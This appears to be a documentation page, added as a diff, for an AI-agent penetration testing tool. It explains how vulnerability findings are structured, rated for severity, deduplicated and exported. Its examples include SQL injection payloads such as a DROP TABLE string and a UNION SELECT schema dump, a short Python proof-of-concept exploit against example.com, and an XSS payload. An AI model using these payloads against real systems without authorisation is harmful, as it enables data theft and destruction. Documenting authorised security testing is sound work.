@@ -1,0 +1,585 @@
+---
+title: Vulnerability Findings
+description: Understand how Pensar Apex discovers, documents, and deduplicates security vulnerabilities
+---
+
+## Overview
+
+A **finding** in Pensar Apex represents a confirmed security vulnerability discovered during penetration testing. Findings include detailed evidence, proof-of-concept exploits, impact analysis, and remediation guidance.
+
+Pensar Apex uses a sophisticated deduplication system to prevent reporting the same vulnerability multiple times, even when multiple agents test the same target concurrently.
+
+## Finding Structure
+
+Each finding is a JSON document with this structure:
+
+```typescript
+export type Finding = {
+  /** Short, descriptive title */
+  title: string;
+  
+  /** Severity level */
+  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
+  
+  /** Detailed description of the vulnerability */
+  description: string;
+  
+  /** Business and technical impact */
+  impact: string;
+  
+  /** Evidence demonstrating the vulnerability */
+  evidence: string;
+  
+  /** The affected endpoint or URL */
+  endpoint: string;
+  
+  /** Path to the proof-of-concept script */
+  pocPath: string;
+  
+  /** How to fix the vulnerability */
+  remediation: string;
+  
+  /** External references (CVEs, articles, etc.) */
+  references?: string;
+  
+  /** Description of the tool call that discovered this */
+  toolCallDescription?: string;
+};
+```
+
+### Example Finding
+
+```json
+{
+  "title": "SQL Injection in User Search Endpoint",
+  "severity": "CRITICAL",
+  "description": "The /api/users/search endpoint accepts a 'query' parameter that is directly interpolated into a SQL query without sanitization or parameterization. An attacker can inject arbitrary SQL to read, modify, or delete database contents.",
+  "impact": "An unauthenticated attacker can extract the entire user database, including password hashes, email addresses, and personal information. They can also modify or delete data, potentially taking over administrator accounts or causing data loss.",
+  "evidence": "Injecting ' OR '1'='1 into the query parameter returned all users in the database (1,247 records). Injecting '; DROP TABLE users; -- caused a 500 error indicating SQL execution.",
+  "endpoint": "https://example.com/api/users/search?query=test",
+  "pocPath": "pocs/sql-injection-user-search-1234567890.py",
+  "remediation": "1. Use parameterized queries or an ORM to prevent SQL injection\n2. Implement input validation and sanitization\n3. Apply principle of least privilege to database user\n4. Enable WAF rules to detect SQL injection attempts\n5. Conduct security code review of all database query construction",
+  "references": "OWASP Top 10 2021 - A03 Injection\nCWE-89: SQL Injection\nhttps://portswigger.net/web-security/sql-injection",
+  "toolCallDescription": "document_vulnerability"
+}
+```
+
+## Severity Levels
+
+Pensar Apex uses four severity levels based on CVSS principles:
+
+<Tabs>
+  <Tab title="Critical">
+    **Critical (9.0-10.0)**
+    
+    Vulnerabilities that allow complete system compromise:
+    - Unauthenticated remote code execution
+    - Full database access without authentication
+    - Authentication bypass on admin interfaces
+    - Mass data exfiltration
+    
+    **Example:** Unauthenticated SQL injection in a public API that exposes the entire user database.
+  </Tab>
+  
+  <Tab title="High">
+    **High (7.0-8.9)**
+    
+    Vulnerabilities that allow significant unauthorized access:
+    - Authenticated remote code execution
+    - Privilege escalation to admin
+    - Sensitive data exposure
+    - SSRF with internal network access
+    
+    **Example:** Insecure direct object reference (IDOR) allowing users to access other users' private data.
+  </Tab>
+  
+  <Tab title="Medium">
+    **Medium (4.0-6.9)**
+    
+    Vulnerabilities that require user interaction or have limited impact:
+    - Stored XSS
+    - CSRF on state-changing operations
+    - Information disclosure
+    - Open redirects
+    
+    **Example:** Reflected XSS requiring victim to click a malicious link.
+  </Tab>
+  
+  <Tab title="Low">
+    **Low (0.1-3.9)**
+    
+    Vulnerabilities with minimal direct security impact:
+    - Missing security headers
+    - Verbose error messages
+    - Minor information leaks
+    - Rate limiting issues
+    
+    **Example:** Missing Content-Security-Policy header allowing limited XSS scenarios.
+  </Tab>
+</Tabs>
+
+<Note>
+  Severity is automatically normalized by the FindingsRegistry using a preprocessing step that maps various severity formats to the canonical CRITICAL/HIGH/MEDIUM/LOW scale.
+</Note>
+
+## Proof of Concept (POC)
+
+Every finding must include a working proof-of-concept script that reliably demonstrates the vulnerability. POCs are stored in the session's `pocs/` directory.
+
+### POC Requirements
+
+<Steps>
+  <Step title="Reliability">
+    The POC must work consistently and reliably reproduce the vulnerability.
+  </Step>
+  
+  <Step title="Clarity">
+    The POC should be well-commented and easy to understand.
+  </Step>
+  
+  <Step title="Safety">
+    The POC should minimize damage (e.g., read-only operations when possible).
+  </Step>
+  
+  <Step title="Documentation">
+    The POC should include usage instructions and expected output.
+  </Step>
+</Steps>
+
+### Example POC Script
+
+```python
+#!/usr/bin/env python3
+"""
+SQL Injection POC for /api/users/search
+
+Demonstrates SQL injection vulnerability in the user search endpoint.
+This POC extracts the database schema to prove the vulnerability without
+causing damage.
+
+Usage:
+  python3 sql-injection-user-search-1234567890.py
+
+Expected Output:
+  Successfully extracted database schema:
+  - Table: users (columns: id, username, email, password_hash, created_at)
+  - Table: posts (columns: id, user_id, title, content, created_at)
+  - Table: comments (columns: id, post_id, user_id, content, created_at)
+"""
+
+import requests
+import sys
+
+TARGET = "https://example.com/api/users/search"
+
+# Payload: Extract database schema using SQL injection
+PAYLOAD = "' UNION SELECT table_name, column_name FROM information_schema.columns -- "
+
+def exploit():
+    print(f"[*] Targeting: {TARGET}")
+    print(f"[*] Payload: {PAYLOAD}")
+    
+    response = requests.get(TARGET, params={"query": PAYLOAD})
+    
+    if response.status_code == 200:
+        print("[+] SQL injection successful!")
+        print("[+] Extracted database schema:")
+        
+        data = response.json()
+        for table in data.get("results", []):
+            print(f"  - Table: {table.get('table_name')}")
+            print(f"    Columns: {table.get('column_name')}")
+        
+        return 0
+    else:
+        print(f"[-] Request failed with status {response.status_code}")
+        return 1
+
+if __name__ == "__main__":
+    sys.exit(exploit())
+```
+
+## Deduplication System
+
+The `FindingsRegistry` prevents duplicate vulnerability reports using a three-tier deduplication system:
+
+### Tier 1: Exact Match
+
+Matches findings with the same **normalized endpoint** and **vulnerability class**:
+
+```typescript
+export function generateFingerprint(finding: Finding): {
+  exactKey: string;
+  appWideKey: string;
+} {
+  const vulnClass = extractVulnClass(finding.title);
+  const endpoint = normalizeEndpoint(finding.endpoint);
+  
+  return {
+    exactKey: `${endpoint}||${vulnClass}`,
+    appWideKey: extractTitleStem(finding.title),
+  };
+}
+```
+
+**Example:**
+- Finding 1: "SQL Injection in https://example.com/api/users?page=1"
+- Finding 2: "SQL Injection in https://example.com/api/users?page=2"
+- **Result:** Deduplicated (same endpoint + vulnerability class)
+
+### Tier 2: Application-Wide Match
+
+Matches findings with the same **title stem** (endpoint-stripped title):
+
+```typescript
+export function extractTitleStem(title: string): string {
+  return title
+    .replace(URL_PATH_PATTERN, "")  // Strip URLs/paths
+    .replace(/[^a-zA-Z0-9 ]/g, " ")  // Normalize
+    .replace(/\s+/g, " ")
+    .trim()
+    .toLowerCase();
+}
+```
+
+**Example:**
+- Finding 1: "Missing CSP header on https://example.com/home"
+- Finding 2: "Missing CSP header on https://example.com/dashboard"
+- **Result:** Deduplicated (same root vulnerability across endpoints)
+
+### Tier 3: Semantic Match (LLM)
+
+When Tier 1 and Tier 2 don't match, the registry uses an LLM to detect semantically similar findings:
+
+```typescript
+private async semanticDedup(
+  finding: Finding,
+  existingFindings: readonly Finding[],
+): Promise<DuplicateCheckResult> {
+  const prompt = buildSemanticDedupPrompt(finding, existingFindings);
+  
+  const result = await generateObjectResponse({
+    model: this.model,
+    schema: SemanticDedupResultSchema,
+    prompt,
+    system: SEMANTIC_DEDUP_SYSTEM,
+  });
+  
+  return result.isDuplicate ? {
+    duplicate: true,
+    matchedFinding: existingFindings[result.matchedIndex - 1],
+    matchType: "semantic",
+  } : { duplicate: false };
+}
+```
+
+**Example:**
+- Finding 1: "SQL Injection vulnerability in user search"
+- Finding 2: "Database query injection in user lookup endpoint"
+- **Result:** Deduplicated by LLM (different wording, same vulnerability)
+
+<Info>
+  Semantic deduplication is conservative: when in doubt, it allows the finding through. It's better to have a borderline duplicate than to suppress a genuinely new vulnerability.
+</Info>
+
+## Findings Registry
+
+The `FindingsRegistry` is the central component for managing findings:
+
+```typescript
+export class FindingsRegistry {
+  /** How many findings are tracked */
+  get size(): number
+  
+  /** Return a snapshot of all tracked findings */
+  getFindings(): readonly Finding[]
+  
+  /** Check if a finding is a duplicate (synchronous, Tier 1+2) */
+  isDuplicate(finding: Finding): DuplicateCheckResult
+  
+  /** Register a new finding (async, includes Tier 3) */
+  async register(finding: Finding): Promise<DuplicateCheckResult>
+  
+  /** Remove a finding (e.g., if persistence failed) */
+  async unregister(finding: Finding): Promise<void>
+}
+```
+
+### Creating a Registry
+
+<CodeGroup>
+
+```typescript Empty Registry
+const registry = new FindingsRegistry({
+  model: "claude-sonnet-4-20250514",
+  authConfig: { anthropicApiKey: process.env.ANTHROPIC_API_KEY },
+});
+```
+
+```typescript From Directory
+// Load existing findings from a session directory
+const registry = FindingsRegistry.fromDirectory(
+  "/path/to/session/findings",
+  {
+    model: "claude-sonnet-4-20250514",
+  },
+);
+```
+
+```typescript From Array
+// Pre-populate with findings from a database
+const existingFindings = await db.findings.findMany();
+const registry = FindingsRegistry.fromFindings(
+  existingFindings,
+  {
+    model: "claude-sonnet-4-20250514",
+  },
+);
+```
+
+</CodeGroup>
+
+### Registering Findings
+
+```typescript
+// Agent discovers a vulnerability
+const newFinding: Finding = {
+  title: "XSS in Comment Form",
+  severity: "HIGH",
+  description: "Stored XSS vulnerability...",
+  impact: "Attacker can execute arbitrary JavaScript...",
+  evidence: "Payload <script>alert(1)</script> executed...",
+  endpoint: "https://example.com/api/comments",
+  pocPath: "pocs/xss-comments-123.py",
+  remediation: "Sanitize user input and encode output...",
+};
+
+// Check for duplicates and register
+const result = await registry.register(newFinding);
+
+if (result.duplicate) {
+  console.log(`Duplicate finding detected (${result.matchType})`);
+  console.log(`Matches existing: ${result.matchedFinding?.title}`);
+} else {
+  console.log("New finding registered");
+  // Persist to disk/database
+  await fs.writeFile(
+    path.join(session.findingsPath, `finding-${Date.now()}.json`),
+    JSON.stringify(newFinding, null, 2),
+  );
+}
+```
+
+## Thread Safety
+
+The FindingsRegistry is **thread-safe** and supports concurrent agent testing:
+
+```typescript
+// Multiple agents can safely register findings concurrently
+const registry = new FindingsRegistry({ model: "claude-sonnet-4-20250514" });
+
+// Spawn multiple pentest agents
+const results = await Promise.all(
+  targets.map(async (target) => {
+    const agent = new TargetedPentestAgent({
+      target: target.url,
+      objectives: [target.objective],
+      model: "claude-sonnet-4-20250514",
+      session,
+      findingsRegistry: registry,  // Shared registry
+    });
+    
+    return agent.consume();
+  }),
+);
+
+// No duplicate findings, even though agents ran concurrently
+console.log(`Total unique findings: ${registry.size}`);
+```
+
+The registry uses a promise-based mutex internally to serialize concurrent `register()` calls while keeping the LLM semantic check outside the critical section for performance.
+
+## Vulnerability Classification
+
+The registry automatically classifies vulnerabilities by type:
+
+```typescript
+const VULN_CLASS_PATTERNS: [RegExp, string][] = [
+  [/sql\s*injection/i, "sql-injection"],
+  [/command\s*injection/i, "command-injection"],
+  [/remote\s*code\s*execution|(\b)rce(\b)/i, "rce"],
+  [/server[\s-]*side\s*request\s*forgery|(\b)ssrf(\b)/i, "ssrf"],
+  [/cross[\s-]*site\s*request\s*forgery|(\b)csrf(\b)/i, "csrf"],
+  [/path\s*traversal|directory\s*traversal/i, "path-traversal"],
+  [/\bidor\b|insecure\s*direct\s*object/i, "idor"],
+  [/\bxss\b|cross[\s-]*site\s*scripting/i, "xss"],
+  [/missing\s*content\s*security\s*policy/i, "missing-csp"],
+  [/authentication\s*bypass/i, "auth-bypass"],
+  [/privilege\s*escalation/i, "privilege-escalation"],
+  [/information\s*disclosure/i, "information-disclosure"],
+];
+
+export function extractVulnClass(title: string): string {
+  for (const [pattern, cls] of VULN_CLASS_PATTERNS) {
+    if (pattern.test(title)) return cls;
+  }
+  // Fallback: normalize title to kebab-case
+  return title.toLowerCase().replace(/[^a-z0-9]+/g, "-");
+}
+```
+
+## Documenting Findings
+
+Agents document findings using the `document_vulnerability` tool:
+
+```typescript
+{
+  tool: "document_vulnerability",
+  args: {
+    title: "SQL Injection in User Search",
+    severity: "CRITICAL",
+    description: "The endpoint accepts unsanitized user input...",
+    impact: "Full database compromise possible...",
+    evidence: "Payload ' OR '1'='1 returned all users...",
+    endpoint: "https://example.com/api/users/search",
+    pocPath: "pocs/sqli-user-search-123.py",
+    remediation: "Use parameterized queries...",
+    references: "OWASP Top 10 - A03 Injection",
+  },
+}
+```
+
+The tool:
+1. Validates the finding structure
+2. Checks the FindingsRegistry for duplicates
+3. Writes the finding to disk (if not duplicate)
+4. Returns a confirmation or duplicate notification
+
+<Warning>
+  **Critical Rule:** Only use `document_vulnerability` for confirmed, exploitable vulnerabilities with working POCs. Never document:
+  - Positive observations ("authentication works correctly")
+  - Testing limitations ("rate limiting prevented testing")
+  - Informational notes
+  - Unconfirmed suspicions
+</Warning>
+
+## Reports and Export
+
+Findings can be exported in multiple formats:
+
+### JSON Export
+
+```typescript
+import { readFileSync, readdirSync } from "fs";
+import { join } from "path";
+
+function loadAllFindings(session: SessionInfo): Finding[] {
+  const findingsDir = session.findingsPath;
+  const files = readdirSync(findingsDir).filter(f => f.endsWith(".json"));
+  
+  return files.map(file => {
+    const content = readFileSync(join(findingsDir, file), "utf-8");
+    return JSON.parse(content) as Finding;
+  });
+}
+
+const findings = loadAllFindings(session);
+const report = {
+  session: session.id,
+  timestamp: new Date().toISOString(),
+  summary: {
+    total: findings.length,
+    critical: findings.filter(f => f.severity === "CRITICAL").length,
+    high: findings.filter(f => f.severity === "HIGH").length,
+    medium: findings.filter(f => f.severity === "MEDIUM").length,
+    low: findings.filter(f => f.severity === "LOW").length,
+  },
+  findings,
+};
+
+console.log(JSON.stringify(report, null, 2));
+```
+
+### Markdown Report
+
+Generate human-readable markdown reports:
+
+```typescript
+function generateMarkdownReport(findings: Finding[]): string {
+  let md = "# Penetration Testing Report\n\n";
+  
+  md += `**Generated:** ${new Date().toISOString()}\n`;
+  md += `**Total Findings:** ${findings.length}\n\n`;
+  
+  for (const severity of ["CRITICAL", "HIGH", "MEDIUM", "LOW"]) {
+    const filtered = findings.filter(f => f.severity === severity);
+    if (filtered.length === 0) continue;
+    
+    md += `## ${severity} Severity (${filtered.length})\n\n`;
+    
+    for (const finding of filtered) {
+      md += `### ${finding.title}\n\n`;
+      md += `**Endpoint:** ${finding.endpoint}\n\n`;
+      md += `**Description:** ${finding.description}\n\n`;
+      md += `**Impact:** ${finding.impact}\n\n`;
+      md += `**Evidence:** ${finding.evidence}\n\n`;
+      md += `**Remediation:** ${finding.remediation}\n\n`;
+      if (finding.references) {
+        md += `**References:** ${finding.references}\n\n`;
+      }
+      md += `**POC:** \`${finding.pocPath}\`\n\n`;
+      md += "---\n\n";
+    }
+  }
+  
+  return md;
+}
+```
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="Always Include POCs">
+    Every finding must have a working proof-of-concept. The POC proves the vulnerability exists and helps developers reproduce and fix it.
+  </Accordion>
+
+  <Accordion title="Use Shared Registry">
+    When running multiple agents concurrently, share a single `FindingsRegistry` instance to prevent duplicate reports.
+  </Accordion>
+
+  <Accordion title="Write Clear Remediation">
+    Include specific, actionable remediation steps. Generic advice like "fix the bug" is not helpful.
+  </Accordion>
+
+  <Accordion title="Provide Context in Evidence">
+    Include the payload, response, and explanation in the evidence field. Screenshots and request/response pairs are valuable.
+  </Accordion>
+
+  <Accordion title="Classify Severity Accurately">
+    Use CVSS principles to determine severity. Consider exploitability, impact, and scope.
+  </Accordion>
+
+  <Accordion title="Handle Registry Failures">
+    If `register()` succeeds but persistence fails, call `unregister()` to remove the phantom finding from the registry.
+  </Accordion>
+</AccordionGroup>
+
+## Related Resources
+
+<CardGroup cols={2}>
+  <Card title="Agent Architecture" icon="sitemap" href="/concepts/agents">
+    Learn about the agents that discover and document findings
+  </Card>
+  
+  <Card title="Penetration Testing" icon="shield-virus" href="/guides/penetration-testing">
+    Complete guide to running security tests
+  </Card>
+  
+  <Card title="Session Management" icon="folder" href="/concepts/sessions">
+    Understand how sessions store findings and POCs
+  </Card>
+  
+  <Card title="API Reference" icon="code" href="/api-reference/findings">
+    Complete API documentation for FindingsRegistry
+  </Card>
+</CardGroup>
